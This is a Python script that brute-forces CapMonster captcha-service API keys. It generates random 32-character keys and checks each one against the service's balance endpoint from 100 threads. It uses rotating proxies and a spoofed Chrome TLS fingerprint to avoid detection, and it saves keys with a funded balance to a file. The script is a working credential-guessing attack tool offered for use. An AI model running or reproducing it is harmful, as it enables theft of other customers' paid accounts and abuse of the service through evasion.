import json
import random
import string
import os
import time
import ctypes
try:
    import requests
    import pystyle
    import colored
    import httpx
    import threading
    from tls_client import Session
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install pystyle')
    os.system('pip install colored')
    os.system('pip install httpx')
    os.system('pip install threading')
    os.system('pip install tls_client')
from pystyle import Colors, Write, System, Colorate
from colored import fg
from threading import Thread, active_count
blue = fg(6)
reset = fg(7)
red = fg(1)
green = fg(2)
purple = fg(5)
pink = fg(216)
yellow = fg(226)
gray = fg(250)

def gen_keys(long):
    char = string.ascii_lowercase + string.digits
    clave = ''.join(random.choice(char) for _ in range(long))
    return clave

def balance():
    proxy = (random.choice(open("proxies.txt", "r").readlines()).strip()
    if len(open("proxies.txt", "r").readlines()) != 0
    else None)
    session_proxy = Session(
        client_identifier="chrome_113",
        random_tls_extension_order=True
    )
    session_proxy.proxies = {
        "http": "http://" + proxy,
        "https": "http://" + proxy
        }
    key = gen_keys(32)
    payload = {
        "clientKey": key
    }
    try:
        response = session_proxy.post("https://api.capmonster.cloud/getBalance", json=payload)
        if response.status_code == 200:
            data = response.json()
            balance = data["balance"]
            return balance, key, True
        elif "ERROR_KEY_DOES_NOT_EXIST" in response.text:
            return None, key, False
        else:
            return None, key, False
    except requests.exceptions.RequestException as e:
        print(f"{purple}[{red}!{purple}]{reset} 502 - Bad Gateaway")
    except Exception as e:
        print(f"{purple}[{red}!{purple}]{reset} TLSClient Exception...")

def start_gen():
    balance_result = balance()

    if balance_result is not None:
        money, clave, is_valid = balance_result
        if is_valid:
            print(f"{purple}[{green}+{purple}]{reset} Valid Key | {blue}{clave}{reset} | {green}${money}")
            with open("valid_keys.txt", "a") as file:
                file.write(clave + " | $" + str(money) + "\n")
            start_gen()
        else:
            print(f"{purple}[{red}-{purple}]{reset} Invalid Key | {blue}{clave}")
            start_gen()

def run():
    while True:
        start_gen()

threads = []
for _ in range(100):
    thread = threading.Thread(target=start_gen)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()